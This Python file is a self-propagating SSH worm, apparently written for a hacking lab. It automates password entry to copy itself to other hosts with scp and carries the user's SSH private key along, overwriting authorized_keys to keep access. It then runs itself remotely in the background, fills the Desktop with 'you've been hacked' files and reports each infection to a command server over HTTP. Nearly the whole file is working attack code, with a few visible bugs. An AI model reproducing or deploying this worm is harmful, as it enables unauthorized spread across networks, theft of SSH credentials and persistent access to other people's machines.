import subprocess
import socket
import sys
import pty
import select
import os
import requests
import time
import _thread

PROMPT = "[worm]"
USER = "admin"
PASS = "hacklab"
PATH = "/home/admin/.local/share/applications/"
DESKTOP_PATH = "/home/admin/Desktop/"
SERVER_IP = ""


class Colours:
    blue = '\033[94m'
    green = '\033[92m'
    end = '\033[0m'


class Authentication():

    def _wait_for(self, fd, expected): # Waits for any responses from console in order to deal with them in ssh_auth
        poll = select.poll()  # Create a polling object
        poll.register(fd, select.POLLIN)  # Poll from the file descriptor stream
        
        while True:
            evt = poll.poll()
            out = os.read(fd, 1024) # Read output of poll

            for str in expected: # Return expected response
                if str.encode("utf-8") in out: 
                    return str    
                    
    def ssh_auth(self, fd): # Automates SSH authentication by entering yes + the password when required
        waiting = True

        while waiting:  # Enter yes and the password as required 
            response = self._wait_for(fd, ["continue","connected", "password"])
            
            if response in ["connected", "continue"]:
                os.write(fd, "yes\n".encode("utf-8"))

            elif response == "password":
                os.write(fd, (PASS + "\n").encode("utf-8"))
                waiting = False

        _, exit_status = os.wait()
        os.close(fd) # Close the stream

    def scp_file(self, host, filename, path): # Copies file to destination if SSH session is authorised 
        pid, fd = pty.fork()

        if pid == 0:  # Executed in child
            os.execvp("scp", ["scp", filename, USER+"@"+host+":"+path])

        elif pid > 0: # Executed in parent.  Authorise ssh session 
            self.ssh_auth(fd)


class Payload():

    def __init__(self):
        self.ip = ""
        self.parent_ip = ""

    def run_threads(self): # Asynchronous tasking of worm tasks
        try:
            # Will run then exit
            _thread.start_new_thread(self.visual, ())

            # Will continue to run in the background
            _thread.start_new_thread(self.post, ())
            _thread.start_new_thread(self.server, ())
        except:
            print("unable to start threads :(")

        while True:
            time.sleep(10)
            
    def visual(self):  # Fills the Desktop with files
        for i in range(30):
            subprocess.run(["touch",
                "{}{}1 you've.wrm".format(DESKTOP_PATH, str(i)),
                "{}{}2 been.wrm".format(DESKTOP_PATH, str(i)),
                "{}{}3 hacked.wrm".format(DESKTOP_PATH, str(i))])

    def post(self): # Informs server that host is infected every three seconds
        time.sleep(3)

        try:
            myjson = {'ip': '10.0.0.12', 'parent_ip': '0'}
            requests.post("http://" + SERVER_IP + ":8000/api/worms/", data = myjson)
        except:
            pass            
    
    # work in progress
    def scanner(self):
        to_infect = ["10.0.0.30"]

        while True:
            for host in to_infect:
                try:
                    print("checking " + host + " if already infected")
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((host, 6969))
                    s.sendall(b"hello")
                    response = s.recv(1024)
                    print("it is infected")
                    if response:
                        try:
                            requests.post("http://" + SERVER_IP + ":9000/", data = {'status':response})
                        except:
                            pass
                except Exception as e:
                    print(e)
                    print("infecting")
                    subprocess.run(["python3", "worm.py", "infect", host])
                    time.sleep(10)
            time.sleep(10)
        
    def server_thread(self, conn):  # Whenever data is recieved, send "infected"
        while True:
            data = conn.recv(1024)
            if not data:
                break

            conn.sendall(b"infected")
    
    def server(self, conn):# Creates an INET, STREAMing socket binds it to port 6969 then makes it a server socket
        serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        serversocket.bind((socket.gethostname(), 6969))
        serversocket.listen()

        while True: # If connection recieved, start a new thread
            conn, host = serversocket.accept()
            _thread.start_new_thread(self.server_thread(conn), (conn,))


class Worm():
    def __init__(self):
        self.auth = Authentication()

    def infect(self, target): # 'Infects' the target machine with the worm
        PROMPT = "[" + target + "]"

        print(Colours.blue + PROMPT, "propagating to", target, Colours.end)

        print(PROMPT, "Copying worm")
        self.auth.scp_file(target, "worm.py", PATH)

        print(PROMPT, "Copying private key")
        self.auth.scp_file(target, "/home/admin/.ssh/id_rsa", "/home/admin/.ssh/")

        print(PROMPT, "Copying public key")
        self.auth.scp_file(target, "/home/admin/.ssh/id_rsa.pub", "/home/admin/.ssh/authorized_keys")

        print(Colours.green + PROMPT, "All files successfully transferred", Colours.end)

        print(PROMPT, "Executing on", target)
        self.execute(target)

        print(Colours.green + PROMPT, "worm running on", target, Colours.end)

    def execute(self, host): # Run the worm on the target
        subprocess.run(["ssh", USER+"@"+host, "nohup", "python3", PATH + "worm.py payload", ">", "/dev/null", "2>&1", "&"])

    def remove(self, target): # Kills the worm and removes files from desktop
        PROMPT = "[" + target + "]"

        print(PROMPT, "Killing worm process")
        subprocess.run(["ssh", USER+"@"+target, "kill", "$(", "ps", "-e", "aux", "|", "grep", "[p]ayload", "|", "awk", "'{print $2}'", ")"])

        print(PROMPT, "Removing all files")
        subprocess.run(["ssh", USER+"@"+target, "rm", DESKTOP_PATH+"*.wrm", PATH+"worm.py", "/home/admin/.ssh/*"])


if __name__ == "__main__":
    worm = Worm()
    payload = Payload()

    if len(sys.argv) < 2:
        print(PROMPT, "need an argument")
    elif sys.argv[1] == "payload":
        payload.run_threads()
    elif sys.argv[1] == "remove" and len(sys.argv) == 3:
        worm.remove(sys.argv[2])
    elif sys.argv[1] == "infect" and len(sys.argv) == 3:
        worm.infect(sys.argv[2])
    else:
        print(PROMPT, "Not a valid argument, options are: payload, remove and infect")
